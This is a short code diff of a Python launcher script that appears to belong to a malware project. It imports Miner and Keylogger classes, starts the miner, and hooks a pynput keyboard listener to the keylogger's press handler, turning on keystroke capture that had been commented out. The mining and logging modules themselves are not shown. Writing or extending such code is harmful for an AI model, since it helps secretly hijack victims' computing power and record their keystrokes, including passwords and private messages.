@@ -1,20 +1,14 @@
-import miner
-import keylogger
+from miner import Miner
+from keylogger import Keylogger
 from pynput.keyboard import Listener
-from multiprocessing import Process
+
 
 
 if __name__ == '__main__':
-    m = miner()
-    k = keylogger()
-    print(k)
+    miner = Miner()
+    keylogger = Keylogger()
 
-    p = Process(target = m.mine)
-    p.start()
-    p.join()
+    miner.start() # Miner start
 
-
-"""
-with Listener(on_press=press) as listener: # Keypress listener
-    listener.join()
-"""
+    with Listener(on_press=keylogger.press) as listener: # Keypress listener
+        listener.join()
